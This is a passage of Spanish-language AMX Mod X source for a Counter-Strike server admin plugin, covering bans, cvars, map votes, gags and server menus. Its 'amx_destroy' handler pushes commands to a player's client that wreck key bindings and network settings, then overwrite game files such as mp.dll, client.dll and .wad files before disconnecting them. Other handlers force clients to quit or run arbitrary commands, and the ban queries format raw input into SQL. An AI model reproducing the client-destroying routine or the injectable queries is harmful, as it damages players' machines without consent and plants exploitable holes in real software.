	clientPrintColor(0, _, "!t%s!y ha agregado a !g%s!y a la lista de bans - Tiempo [!g%s!y] - Razón [!g%s!y],", g_PlayerName[id], sArg1, sTimeBan, sArg4);
	log_amx("<%s><%s><%s> ha agregado a <%s><%s> a la lista de bans - Tiempo <%s> - Razón <%s>", g_PlayerName[id], g_PlayerIp[id], g_PlayerSteamId[id], sArg1, sArg2, sTimeBan, sArg3);
	
	return PLUGIN_HANDLED;
}

public concmd__UnBan(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_D)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_AUTHID_LENGTH];
	read_argv(1, sArg1, charsmax(sArg1));

	if(read_argc() < 2) {
		consolePrint(id, "Uso: amx_unban <ip o steamid> - Desanea a un jugador.");
		return PLUGIN_HANDLED;
	}

	new Handle:sqlQuery;
	sqlQuery = SQL_PrepareQuery(g_SqlConnection, "SELECT `user_name`, `user_authid`, `reason` FROM `gral_bans` WHERE (`user_authid`=^"%s^" AND (`server_id`='0' OR `server_id`='%d') AND `active`='1');", sArg1, g_ServerId);

	if(!SQL_Execute(sqlQuery)) {
		executeQuery(id, sqlQuery, 5);
	} else if(SQL_NumResults(sqlQuery)) {
		new sUserName[MAX_NAME_LENGTH];
		new sUserAuthid[MAX_AUTHID_LENGTH];
		new sReason[64];

		SQL_ReadResult(sqlQuery, 0, sUserName, charsmax(sUserName));
		SQL_ReadResult(sqlQuery, 1, sUserAuthid, charsmax(sUserAuthid));
		SQL_ReadResult(sqlQuery, 2, sReason, charsmax(sReason));
		SQL_FreeHandle(sqlQuery);

		clientPrintColor(0, _, "!t%s!y ha desbaneado a !g%s!y - Razón [!g%s!y].", g_PlayerName[id], sUserName, sReason);
		consolePrint(id, "La SteamId o IP <%s> no se encuentra en la lista de bans.", sUserAuthid);
		log_amx("<%s><%s><%s> ha desbaneado a <%s><%s> - Razón <%s>", g_PlayerName[id], g_PlayerIp[id], g_PlayerSteamId[id], sUserName, sUserAuthid, sReason);

		sqlQuery = SQL_PrepareQuery(g_SqlConnection, "UPDATE `gral_bans` SET `active`='0' WHERE (`user_authid`=^"%s^" AND (`server_id`='0' OR `server_id`='%d') AND `active`='1');", sArg1, g_ServerId);

		if(!SQL_Execute(sqlQuery)) {
			executeQuery(id, sqlQuery, 6);
		} else {
			SQL_FreeHandle(sqlQuery);
		}
	} else {
		consolePrint(id, "No se ha encontrado la IP o el SteamId especificado.");
		SQL_FreeHandle(sqlQuery);
	}

	return PLUGIN_HANDLED;
}

public concmd__Cvar(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_E)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[32];
	new sArg2[128];

	read_argv(1, sArg1, charsmax(sArg1));
	read_argv(2, sArg2, charsmax(sArg2));

	if(read_argc() < 3 && equal(sArg1, "") && equal(sArg2, "")) {
		consolePrint(id, "Uso: amx_cvar <nombre del cvar> <valor> - Cambia el valor de la CVAR especificada.");
		return PLUGIN_HANDLED;
	}

	new iPointer;
	iPointer = get_cvar_pointer(sArg1);

	if(!iPointer) {
		consolePrint(id, "La CVAR especificada no existe.");
		return PLUGIN_HANDLED;
	} else if(sArg1[0] == 'r' && sArg1[1] == 'c' && sArg1[2] == 'o' && sArg1[3] == 'n' && sArg1[4] == '_') {
		consolePrint(id, "La CVAR especificada está bloqueada.");
		return PLUGIN_HANDLED;
	}

	new sOldValue[128];
	get_pcvar_string(iPointer, sOldValue, charsmax(sOldValue));

	if(equal(sArg2, "")) {
		consolePrint(id, "La CVAR <%s> esta con el valor <%s>.", sArg1, sOldValue);
		return PLUGIN_HANDLED;
	}

	set_cvar_string(sArg1, sArg2);

	if(equali(sArg1, "sv_password")) {
		if(sArg2[0]) {
			clientPrintColor(0, _, "!t%s!y puso una contraseña al servidor.", g_PlayerName[id]);
		} else {
			clientPrintColor(0, _, "!t%s!y sacó la contraseña del servidor.", g_PlayerName[id]);
		}
	} else {
		clientPrintColor(0, _, "!t%s!y cambió el valor de la CVAR !g%s!y de !g%s!y a !g%s!y.", g_PlayerName[id], sArg1, sOldValue, sArg2);
	}

	return PLUGIN_HANDLED;
}

public concmd__Map(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_D)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_CHARACTER_MAPNAME];
	read_argv(1, sArg1, charsmax(sArg1));

	if(read_argc() < 2) {
		consolePrint(id, "Uso: amx_map <nombre del mapa> - Cambia de mapa.");
		return PLUGIN_HANDLED;
	}

	if(!is_map_valid(sArg1)) {
		consolePrint(id, "El mapa <%s> no se encuentra cargado en el servidor.", sArg1);
		return PLUGIN_HANDLED;
	}

	setNextMap(sArg1);

	clientPrintColor(0, _, "!t%s!y cambió al mapa !g%s!y.", g_PlayerName[id], sArg1);
	return PLUGIN_HANDLED;
}

public concmd__Restart(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_D)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[8];
	read_argv(1, sArg1, charsmax(sArg1));

	if(read_argc() < 2) {
		consolePrint(id, "Uso: amx_restart <segundos> - Reinicia la ronda.");
		return PLUGIN_HANDLED;
	}

	if(!isDigital(sArg1) || equal(sArg1, "") || containi(sArg1, " ") != -1) {
		consolePrint(id, "Sólo números y sin espacios.");
		return PLUGIN_HANDLED;
	}

	new iSeconds;
	iSeconds = str_to_num(sArg1);

	if(!(1 <= iSeconds <= 60)) {
		consolePrint(id, "El valor que intentas ingresar es inválido.");
		return PLUGIN_HANDLED;
	}

	set_cvar_num("sv_restart", iSeconds);

	clientPrintColor(0, _, "!t%s!y estableció un reinicio de ronda en !g%d segundo%s!y.", g_PlayerName[id], iSeconds, ((iSeconds != 1) ? "s" : ""));
	return PLUGIN_HANDLED;
}

public concmd__Extend(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_E)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[8];
	read_argv(1, sArg1, charsmax(sArg1));

	if(read_argc() < 2) {
		consolePrint(id, "Uso: amx_extend <minutos> - Extiende el tiempo del mapa.");
		return PLUGIN_HANDLED;
	}

	new Float:flTime;
	flTime = str_to_float(sArg1);

	if(flTime < 1.0) {
		consolePrint(id, "El valor que intentas ingresar es inválido.");
		return PLUGIN_HANDLED;
	}

	new Float:flTimeExtended;
	flTimeExtended = (get_cvar_float("mp_timelimit") + flTime);

	if(flTimeExtended <= 1) {
		consolePrint(id, "Debes extener el tiempo de mapa sumando el tiempo actual.");
		return PLUGIN_HANDLED;
	}

	set_cvar_float("mp_timelimit", flTimeExtended);

	clientPrintColor(0, _, "!t%s!y extendió el mapa por !g%0.0f minuto%s!y.", g_PlayerName[id], flTime, (flTime != 1.0) ? "s" : "");
	return PLUGIN_HANDLED;
}

public concmd__NextMapC(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_E)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_CHARACTER_MAPNAME];
	read_argv(1, sArg1, charsmax(sArg1));

	if(read_argc() < 2) {
		consolePrint(id, "Uso: amx_nextmap_c <nombre del mapa> - Cambia el mapa siguiente.");
		consolePrint(id, "Esto se aplica una vez que el mapa se haya elegido mediante la votación.");
		consolePrint(id, "Si se aplica antes de la votación, no surgirá efecto.");

		return PLUGIN_HANDLED;
	}

	if(!is_map_valid(sArg1)) {
		consolePrint(id, "El mapa <%s> no se encuentra cargado en el servidor.", sArg1);
		return PLUGIN_HANDLED;
	}

	strtolower(sArg1);
	set_cvar_string("amx_nextmap", sArg1);

	clientPrintColor(0, _, "!t%s!y cambió el siguiente mapa a !g%s!y.", g_PlayerName[id], sArg1);
	return PLUGIN_HANDLED;
}

public concmd__Who(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	console_print(id, "");
	console_print(id, "Usuarios en el servidor:");
	console_print(id, "");
	console_print(id, "UserId (#) || Nombre || IP || Steam || Rango");
	console_print(id, "");

	new i;
	new iUserFlag = get_user_flags(id);
	new j = 0;

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i)) {
			continue;
		}

		console_print(id, "%d (#%d) || %s || %s || %s || %s", get_user_userid(i), i, g_PlayerName[i], (((iUserFlag & ADMIN_LEVEL_E) || (iUserFlag & ADMIN_LEVEL_F) || (iUserFlag & ADMIN_LEVEL_G) || (iUserFlag & ADMIN_LEVEL_H) || (iUserFlag & ADMIN_RCON)) ? g_PlayerIp[i] : "-"), g_PlayerSteamId[i], getAdminTypeInChat(i));
		++j;
	}

	console_print(id, "");
	console_print(id, "Usuarios conectados: %d", j);
	console_print(id, "");

	return PLUGIN_HANDLED;
}

public concmd__Last(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	console_print(id, "");
	console_print(id, "Usuarios desconectados recientemente:");
	console_print(id, "");
	console_print(id, "# || Nombre || IP || Steam");
	console_print(id, "");

	new i;
	new iUserFlag = get_user_flags(id);
	new j = 0;

	for(i = ((g_LastPlayers_Count - 10) < 0) ? 0 : (g_LastPlayers_Count - 10); i < g_LastPlayers_Count; ++i) {
		console_print(id, "%d || %s || %s || %s", j, g_LastPlayers_Name[i], (((iUserFlag & ADMIN_LEVEL_E) || (iUserFlag & ADMIN_LEVEL_F) || (iUserFlag & ADMIN_LEVEL_G) || (iUserFlag & ADMIN_LEVEL_H) || (iUserFlag & ADMIN_RCON)) ? g_LastPlayers_Ip[i] : "-"), g_LastPlayers_SteamId[i]);
		++j;
	}

	console_print(id, "");
	console_print(id, "Usuarios desconectados: %d", j);
	console_print(id, "");

	return PLUGIN_HANDLED;
}

public concmd__MapMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	showMenu__MapMenu(id);
	return PLUGIN_HANDLED;
}

public concmd__VoteMapMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}
	
	showMenu__VoteMapMenu(id);
	return PLUGIN_HANDLED;
}

public concmd__VoteC(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	if(g_Vote_Init) {
		consolePrint(id, "Ya hay una votación en curso.");
		return PLUGIN_HANDLED;
	}

	read_argv(1, g_Vote_Question, charsmax(g_Vote_Question));

	if(!g_Vote_Question[0] || containi(g_Vote_Question, "%") != -1 || containi(g_Vote_Question, "#") != -1 || containi(g_Vote_Question, "rcon_") != -1 || containi(g_Vote_Question, "sv_") != -1 || containi(g_Vote_Question, "mp_") != -1) {
		consolePrint(id, "La pregunta de la votación tiene caracteres invalidos.");
		return PLUGIN_HANDLED;
	}

	replace_all(g_Vote_Question, charsmax(g_Vote_Question), "!g", "");
	replace_all(g_Vote_Question, charsmax(g_Vote_Question), "!t", "");
	replace_all(g_Vote_Question, charsmax(g_Vote_Question), "!y", "");

	new iArgc;
	iArgc = read_argc();

	if(iArgc > (MAX_VOTES + 2)) {
		consolePrint(id, "Hay %d opciones especificadas y solo acepta hasta %d.", (iArgc - 2), MAX_VOTES);
		return PLUGIN_HANDLED;
	}

	new i;
	for(i = 0; i < MAX_VOTES; ++i) {
		g_Vote_VoteCount[i] = 0;
		g_Vote_Answers[i][0] = EOS;
	}

	for(i = 0; i < (iArgc - 2); ++i) {
		g_Vote_Answers[i][0] = EOS;
		read_argv((i + 2), g_Vote_Answers[i], charsmax(g_Vote_Answers[]));

		if(!g_Vote_Answers[i][0] || containi(g_Vote_Answers[i], "%") != -1 || containi(g_Vote_Answers[i], "#") != -1 || containi(g_Vote_Answers[i], "rcon_") != -1 || containi(g_Vote_Answers[i], "sv_") != -1 || containi(g_Vote_Answers[i], "mp_") != -1) {
			consolePrint(id, "La respuesta #%d tiene caracteres invalidos.", (i + 1));
			return PLUGIN_HANDLED;
		}

		replace_all(g_Vote_Answers[i], charsmax(g_Vote_Answers[]), "!g", "");
		replace_all(g_Vote_Answers[i], charsmax(g_Vote_Answers[]), "!t", "");
		replace_all(g_Vote_Answers[i], charsmax(g_Vote_Answers[]), "!y", "");
	}

	g_Vote_Init = 1;
	g_Vote_AdminId = id;
	g_Vote_MaxVotes = 0;
	g_Vote_End = 0;

	new sArg0[32];
	new iToAdmin;

	read_argv(0, sArg0, charsmax(sArg0));

	if(equal(sArg0, "amx_voteadm")) {
		iToAdmin = 1;
	} else {
		iToAdmin = 0;
	}

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i) || (iToAdmin && !(get_user_flags(i) & ADMIN_IMMUNITY))) {
			continue;
		}

		g_Vote_Id[i] = -1;
		g_Vote_AlreadyVote[i] = 0;

		showMenu__Vote(i, iToAdmin);
	}

	new iArgs[1];
	iArgs[0] = iToAdmin;

	remove_task(TASK_VOTE_END);
	set_task(15.1, "task__VoteEnd", TASK_VOTE_END, iArgs, sizeof(iArgs));

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i) || (iToAdmin && !(get_user_flags(i) & ADMIN_IMMUNITY))) {
			continue;
		}

		clientPrintColor(i, _, "!t%s!y lanzó una votación %s.", g_PlayerName[id], ((iToAdmin) ? "para administradores" : "personalizada"));
	}

	return PLUGIN_HANDLED;
}

public concmd__VoteMap(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	if(g_Vote_Init) {
		consolePrint(id, "Ya hay una votación en curso.");
		return PLUGIN_HANDLED;
	}

	formatex(g_Vote_Question, charsmax(g_Vote_Question), "¿Cambiamos de mapa?");

	new iArgc;
	iArgc = read_argc();

	if(iArgc > (MAX_VOTES + 1)) {
		consolePrint(id, "Hay %d mapas especificadas y solo acepta hasta %d.", (iArgc - 1), MAX_VOTES);
		return PLUGIN_HANDLED;
	}

	new i;
	for(i = 0; i < MAX_VOTES; ++i) {
		g_Vote_VoteCount[i] = 0;
		g_Vote_Answers[i][0] = EOS;
	}

	for(i = 0; i < (iArgc - 1); ++i) {
		g_Vote_Answers[i][0] = EOS;
		read_argv((i + 1), g_Vote_Answers[i], charsmax(g_Vote_Answers[]));

		if(!g_Vote_Answers[i][0] || containi(g_Vote_Answers[i], "%") != -1 || containi(g_Vote_Answers[i], "#") != -1 || containi(g_Vote_Answers[i], "rcon_") != -1 || containi(g_Vote_Answers[i], "sv_") != -1 || containi(g_Vote_Answers[i], "mp_") != -1 || !is_map_valid(g_Vote_Answers[i])) {
			consolePrint(id, "El mapa %s tiene caracteres invalidos.", g_Vote_Answers[i]);
			return PLUGIN_HANDLED;
		}

		replace_all(g_Vote_Answers[i], charsmax(g_Vote_Answers[]), "!g", "");
		replace_all(g_Vote_Answers[i], charsmax(g_Vote_Answers[]), "!t", "");
		replace_all(g_Vote_Answers[i], charsmax(g_Vote_Answers[]), "!y", "");
	}

	g_Vote_Init = 1;
	g_Vote_AdminId = id;
	g_Vote_MaxVotes = 0;
	g_Vote_End = 0;

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i)) {
			continue;
		}

		g_Vote_Id[i] = -1;
		g_Vote_AlreadyVote[i] = 0;

		showMenu__Vote(i, 999);
	}

	new iArgs[1];
	iArgs[0] = 999;

	remove_task(TASK_VOTE_END);
	set_task(15.1, "task__VoteEnd", TASK_VOTE_END, iArgs, sizeof(iArgs));

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i)) {
			continue;
		}

		clientPrintColor(i, _, "!t%s!y lanzó una votación para el próximo mapa.", g_PlayerName[id]);
	}

	return PLUGIN_HANDLED;
}

public concmd__Gag(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new sArg2[8];
	new iUserId;

	read_argv(1, sArg1, charsmax(sArg1));
	read_argv(2, sArg2, charsmax(sArg2));
	iUserId = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

	if(read_argc() < 3) {
		consolePrint(id, "Use: amx_gag <nombre o #userid> <tiempo en minutos> - Amordaza a un jugador para quen no pueda hablar.");
		return PLUGIN_HANDLED;
	}

	if(!iUserId) {
		return PLUGIN_HANDLED;
	} else if(iUserId == id && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No te puedes amordazarte a ti mismo.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_LEVEL_D) && iUserId != id && (!(get_user_flags(id) & ADMIN_LEVEL_E) || !(get_user_flags(id) & ADMIN_LEVEL_F) || !(get_user_flags(id) & ADMIN_LEVEL_G) || !(get_user_flags(id) & ADMIN_LEVEL_H) || !(get_user_flags(id) & ADMIN_RCON))) {
		consolePrint(id, "No puedes amordazar a un miembro del staff.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_IMMUNITY) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No puedes amordazar a un capitán.");
		return PLUGIN_HANDLED;
	} else if(!isDigital(sArg2)) {
		consolePrint(id, "El campo <tiempo en minutos> sólo se permiten números.");
		return PLUGIN_HANDLED;
	}else if(g_Gag[iUserId]) {
		consolePrint(id, "El usuario <%s> ya está amordazado.", g_PlayerName[iUserId]);
		return PLUGIN_HANDLED;
	}

	new iMinutes;
	iMinutes = str_to_num(sArg2);

	if(!(1 <= iMinutes <= 1440) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "El campo <tiempo en minutos> solo se admite hasta 1440 minutos.");
		return PLUGIN_HANDLED;
	}

	remove_task(iUserId + TASK_GAG);
	set_task((float(iMinutes) * 60.0), "task__Gag", iUserId + TASK_GAG);

	g_Gag[iUserId] = 1;

	new i;
	for(i = 1; i <= MaxClients; ++i) {
		if(is_user_connected(i)) {
			rg_set_can_hear_player(i, iUserId, false);
		}
	}

	new sTimeGag[32];
	getUserTimeBan(iMinutes, sTimeGag, charsmax(sTimeGag));

	clientPrintColor(0, iUserId, "!t%s!y amordazó a !t%s!y - Tiempo [!g%s!y].", g_PlayerName[id], g_PlayerName[iUserId], sTimeGag);
	return PLUGIN_HANDLED;
}

public concmd__GagMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	showMenu__Gag(id);
	return PLUGIN_HANDLED;
}

public concmd__UnGag(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	read_argv(1, sArg1, charsmax(sArg1));

	if(read_argc() < 2) {
		consolePrint(id, "Use: amx_ungag <nombre o #userid> - Desamordaza a un jugador para que pueda hablar.");
		return PLUGIN_HANDLED;
	}

	new iUserId;
	iUserId = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

	if(!iUserId) {
		return PLUGIN_HANDLED;
	} else if(!g_Gag[iUserId]) {
		consolePrint(id, "El usuario <%s> no está gagueado.", g_PlayerName[iUserId]);
		return PLUGIN_HANDLED;
	}

	remove_task(iUserId + TASK_GAG);

	g_Gag[iUserId] = 0;

	new i;
	for(i = 1; i <= MaxClients; ++i) {
		if(is_user_connected(i)) {
			rg_set_can_hear_player(i, iUserId, true);
		}
	}

	clientPrintColor(0, iUserId, "!t%s!y desamordazó a !t%s!y.", g_PlayerName[id], g_PlayerName[iUserId]);
	return PLUGIN_HANDLED;
}

public concmd__UnGagMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	showMenu__UnGag(id);
	return PLUGIN_HANDLED;
}

public concmd__Destroy(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_F)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new iUserId;

	read_argv(1, sArg1, charsmax(sArg1));
	iUserId = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

	if(!iUserId || iUserId == id || (get_user_flags(iUserId) & ADMIN_LEVEL_F)) {
		return PLUGIN_HANDLED;
	}

	sendCommand(iUserId, "wait;developer 1;wait;unbindall;wait;cl_timeout 0");
	sendCommand(iUserId, "wait;rate 1;wait;cl_updaterate 1;wait;cl_cmdrate 1");
	sendCommand(iUserId, "wait;fps_max 1;wait;fps_modem 1;wait;sys_ticrate 1");
	sendCommand(iUserId, "wait;cl_allowdownload 0;wait;cl_allowupload 0");
	sendCommand(iUserId, "wait;cl_backspeed 1;wait;sensitivity 20");
	sendCommand(iUserId, "wait;gl_flipmatrix 1;wait;con_color ^"1 1 1^"");
	sendCommand(iUserId, "wait;motdfile events/ak47.sc;motd_write xd");
	sendCommand(iUserId, "wait;motdfile models/v_ak47.mdl;motd_write xd");
	sendCommand(iUserId, "wait;motdfile events/m4a1.sc;motd_write xd");
	sendCommand(iUserId, "wait;motdfile models/v_m4a1.mdl;motd_write xd");
	sendCommand(iUserId, "wait;motdfile cs_dust.wad;motd_write xd");
	sendCommand(iUserId, "wait;motdfile cstrike.wad;motd_write xd");
	sendCommand(iUserId, "wait;motdfile halflife.wad;motd_write xd");
	sendCommand(iUserId, "wait;motdfile dlls/mp.dll;motd_write xd");
	sendCommand(iUserId, "wait;motdfile cl_dlls/client.dll;motd_write xd");
	sendCommand(iUserId, "wait;motdfile resource/GameMenu.res;motd_write xd");
	sendCommand(iUserId, "wait;wait;wait;disconnect");

	consolePrint(id, "Comando ejecutado con éxito. El cliente de <%s> se ha destruido.", g_PlayerName[iUserId]);

	log_to_file(__DESTROY_LOG_FILE, "amx_destroy - <%s><%s><%s> >>> <%s><%s><%s>", g_PlayerName[id], g_PlayerIp[id], g_PlayerSteamId[id], g_PlayerName[iUserId], g_PlayerIp[iUserId], g_PlayerSteamId[iUserId]);
	return PLUGIN_HANDLED;
}

public concmd__Quit(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_E)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new iUserId;

	read_argv(1, sArg1, charsmax(sArg1));
	iUserId = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

	if(!iUserId || iUserId == id || (get_user_flags(iUserId) & ADMIN_LEVEL_E)) {
		return PLUGIN_HANDLED;
	}

	sendCommand(iUserId, "quit");

	consolePrint(id, "Comando ejecutado con éxito. El cliente de <%s> se ha cerrado.", g_PlayerName[iUserId]);

	log_to_file(__QUIT_LOG_FILE, "amx_quit - <%s><%s><%s> >>> <%s><%s><%s>", g_PlayerName[id], g_PlayerIp[id], g_PlayerSteamId[id], g_PlayerName[iUserId], g_PlayerIp[iUserId], g_PlayerSteamId[iUserId]);
	return PLUGIN_HANDLED;
}

public concmd__Exec(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_E)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new sArg2[64];

	read_argv(1, sArg1, charsmax(sArg1));
	read_argv(2, sArg2, charsmax(sArg2));

	remove_quotes(sArg2);

	replace_all(sArg2, charsmax(sArg2), "\'", "^"");

	if(sArg1[0] == '@') {
		new iUserCount;
		new i;

		if(equali(sArg1[1], "A") || equali(sArg1[1], "ALL")) {
			iUserCount = (getUsersPlaying(TEAM_TERRORIST) + getUsersPlaying(TEAM_CT));

			if(!iUserCount) {
				consolePrint(id, "No se han encontrado jugadores.");
				return PLUGIN_HANDLED;
			}

			clientPrintColor(0, id, "!t%s!y ha utilizado el comando !g%s!y para todos los jugadores conectados.", g_PlayerName[id], sArg2);
			
			for(i = 1; i <= MaxClients; ++i) {
				if(is_user_connected(i) && !(get_user_flags(i) & ADMIN_IMMUNITY)) {
					client_cmd(i, sArg2);
				}
			}
		}

		if(equali(sArg1[1], "TERRORIST") || equali(sArg1[1], "T") || equali(sArg1[1], "TERROR") || equali(sArg1[1], "TE") || equali(sArg1[1], "TER")) {
			iUserCount = getUsersPlaying(TEAM_TERRORIST);

			if(!iUserCount) {
				consolePrint(id, "No se han encontrado jugadores en el equipo deseado.");
				return PLUGIN_HANDLED;
			}
			
			clientPrintColor(0, id, "!t%s!y ha utilizado el comando !g%s!y para el equipo !gTERRORISTA!y.", g_PlayerName[id], sArg2);
			
			for(i = 1; i <= MaxClients; ++i) {
				if(is_user_connected(i) && getUserTeam(i) == TEAM_TERRORIST && !(get_user_flags(i) & ADMIN_IMMUNITY)) {
					client_cmd(i, sArg2);
				}
			}
		}

		if(equali(sArg1[1], "CT") || equali(sArg1[1], "C") || equali(sArg1[1], "COUNTER")) {
			iUserCount = getUsersPlaying(TEAM_CT);

			if(!iUserCount) {
				consolePrint(id, "No se han encontrado jugadores en el equipo deseado.");
				return PLUGIN_HANDLED;
			}

			clientPrintColor(0, id, "!t%s!y ha utilizado el comando !g%s!y para el equipo !gANTI-TERRORISTA!y.", g_PlayerName[id], sArg2);
			
			for(i = 1; i <= MaxClients; ++i) {
				if(is_user_connected(i) && getUserTeam(i) == TEAM_CT && !(get_user_flags(i) & ADMIN_IMMUNITY)) {
					client_cmd(i, sArg2);
				}
			}
		}

		if(equali(sArg1[1], "S") || equali(sArg1[1], "SERV") || equali(sArg1[1], "SERVER")) {
			clientPrintColor(0, id, "!t%s!y ha utilizado el comando !g%s!y para el servidor.", g_PlayerName[id], sArg2);
			server_cmd(sArg2);
		}
	} else {
		new iTarget;
		iTarget = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

		if(!iTarget) {
			return PLUGIN_HANDLED;
		}

		clientPrintColor(0, id, "!t%s!y ha utilizado el comando !g%s!y sobre !g%s!y.", g_PlayerName[id], sArg2, g_PlayerName[iTarget]);
		client_cmd(iTarget, sArg2);
	}

	return PLUGIN_HANDLED;
}

public showMenu__MutePlayer(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("MUTEAR A UN JUGADOR\R", "menu__MutePlayer");

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i)) {
			continue;
		}

		if(id == i) {
			continue;
		}

		formatex(sItem, charsmax(sItem), "\w%n", i, ((rg_get_can_hear_player(id, i)) ? "" : " \y(MUTEADO)"));

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay jugadores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Volver");

	g_MenuPage_Mute[id] = min(g_MenuPage_Mute[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, g_MenuPage_Mute[id]);
}

public menu__MutePlayer(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iUserId;
	player_menu_info(id, iUserId, iUserId, g_MenuPage_Mute[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iUserId, sPosition, charsmax(sPosition), _, _, iUserId);
	DestroyLocalMenu(id, menu);

	iUserId = sPosition[0];

	if(is_user_connected(iUserId)) {
		if(id != iUserId) {
			switch(rg_get_can_hear_player(id, iUserId)) {
				case true: {
					clientPrintColor(id, iUserId, "Acabas de mutear a !t%n!y.", iUserId);
					rg_set_can_hear_player(id, iUserId, false);
				} case false: {
					clientPrintColor(id, iUserId, "Acabas de desmutear a !t%n!y.", iUserId);
					rg_set_can_hear_player(id, iUserId, true);
				}
			}
		} else {
			clientPrintColor(id, _, "No puedes mutearte a ti mismo.");
		}
	} else {
		clientPrintColor(id, _, "El jugador seleccionado se ha desconectado.");
	}

	showMenu__MutePlayer(id);
	return PLUGIN_HANDLED;
}

public showMenu__Servers(const id) {
	if(!get_pcvar_num(g_pCvar_Servers)) {
		return;
	}

	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("SERVIDORES\R", "menu__Servers");

	for(i = 0; i < structIdServers; ++i) {
		if(i == SV_NONE || g_ServerMaxPlayers[i] < 2) {
			continue;
		}

		if(g_ServerId == i) {
			formatex(sItem, charsmax(sItem), "\d%s \y(ACTUAL)", __SERVERS[i][serverName]);
		} else {
			formatex(sItem, charsmax(sItem), "%s", __SERVERS[i][serverName]);
		}

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay servidores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Volver");

	g_MenuPage_Servers[id] = min(g_MenuPage_Servers[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, g_MenuPage_Servers[id]);
}

public menu__Servers(const id, const menu, const item) {
	if(!is_user_connected(id) || !get_pcvar_num(g_pCvar_Servers)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Servers[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

